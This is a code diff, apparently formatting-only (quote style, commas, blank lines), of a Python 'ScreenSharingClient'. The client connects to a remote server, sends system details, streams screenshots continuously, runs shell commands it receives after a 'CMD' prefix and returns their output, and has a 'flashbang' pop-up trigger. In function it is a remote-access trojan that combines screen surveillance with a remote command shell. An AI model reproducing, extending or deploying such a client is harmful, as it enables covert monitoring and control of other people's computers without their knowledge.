@@ -13,8 +13,9 @@ import asyncio
 import os
 import subprocess
 
+
 class ScreenSharingClient:
-    def __init__(self, server_ip='ENDOSPC', image_port=5001, command_port=5002):
+    def __init__(self, server_ip="ENDOSPC", image_port=5001, command_port=5002):
         self.server_ip = server_ip
         self.image_port = image_port
         self.command_port = command_port
@@ -41,8 +42,8 @@ class ScreenSharingClient:
     def send_system_info(self):
         try:
             system_info = self.get_system_info()
-            self.command_socket.send(system_info.encode('utf-8'))
-            acknowledgment = self.command_socket.recv(1024).decode('utf-8')
+            self.command_socket.send(system_info.encode("utf-8"))
+            acknowledgment = self.command_socket.recv(1024).decode("utf-8")
             if acknowledgment.lower() == "received":
                 self.start_screen_share()
         except Exception as e:
@@ -52,7 +53,7 @@ class ScreenSharingClient:
     def receive_commands(self):
         try:
             while True:
-                command = self.command_socket.recv(1024).decode('utf-8')
+                command = self.command_socket.recv(1024).decode("utf-8")
                 if command.lower() == "flashbang":
                     self.trigger_flashbang()
                 elif command.startswith("message"):
@@ -61,7 +62,7 @@ class ScreenSharingClient:
                 elif command.startswith("CMD"):
                     cmd = command[3:]
                     output = self.terminalFunction(cmd)
-                    self.command_socket.send(output.encode('utf-8'))
+                    self.command_socket.send(output.encode("utf-8"))
                 elif command.lower() == "stop_screenshare":
                     self.stop_screen_share()
                 elif command.lower() == "start_screenshare":
@@ -83,21 +84,22 @@ class ScreenSharingClient:
             while self.is_screen_sharing:
                 screenshot = pyautogui.screenshot()
                 buffer = io.BytesIO()
-                screenshot.save(buffer, format='JPEG', quality=100)
+                screenshot.save(buffer, format="JPEG", quality=100)
                 data = buffer.getvalue()
                 size = len(data)
 
-                self.image_socket.sendall(size.to_bytes(4, 'big'))
+                self.image_socket.sendall(size.to_bytes(4, "big"))
                 self.image_socket.sendall(data)
                 time.sleep(0.001)
         except Exception as e:
             print(f"Error sending screenshot: {e}")
+
     def terminalFunction(self, cmd):
         try:
             if cmd.startswith("cd"):
                 new_dir = cmd[3:].strip()
-                if new_dir == '/':
-                    new_dir = 'C:\\' if os.name == 'nt' else '/'
+                if new_dir == "/":
+                    new_dir = "C:\\" if os.name == "nt" else "/"
                 new_dir = os.path.abspath(os.path.join(self.current_directory, new_dir))
                 if os.path.isdir(new_dir):
                     os.chdir(new_dir)
@@ -113,10 +115,10 @@ class ScreenSharingClient:
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     cwd=self.current_directory,
-                    text=True
+                    text=True,
                 )
                 stdout, stderr = process.communicate()
-                
+
                 stdout_str = stdout
                 stderr_str = stderr
                 if process.returncode == 0:
@@ -132,17 +134,17 @@ class ScreenSharingClient:
 
     def get_system_info(self):
         system_info = {
-            'System Name': platform.node(),
-            'System': platform.system(),
-            'OS Release': platform.release(),
-            'OS Version': platform.version(),
-            'Machine Type': platform.machine(),
-            'CPU': platform.processor()
+            "System Name": platform.node(),
+            "System": platform.system(),
+            "OS Release": platform.release(),
+            "OS Version": platform.version(),
+            "Machine Type": platform.machine(),
+            "CPU": platform.processor(),
         }
         return str(system_info)
 
     def trigger_flashbang(self):
-        if hasattr(self, 'error_box') and self.error_box.winfo_exists():
+        if hasattr(self, "error_box") and self.error_box.winfo_exists():
             return
 
         self.error_box = tk.Tk()
@@ -170,6 +172,7 @@ class ScreenSharingClient:
             self.is_screen_sharing = False
             if self.screenshot_thread and self.screenshot_thread.is_alive():
                 self.screenshot_thread.join()
+
 
 if __name__ == "__main__":
     client = ScreenSharingClient()
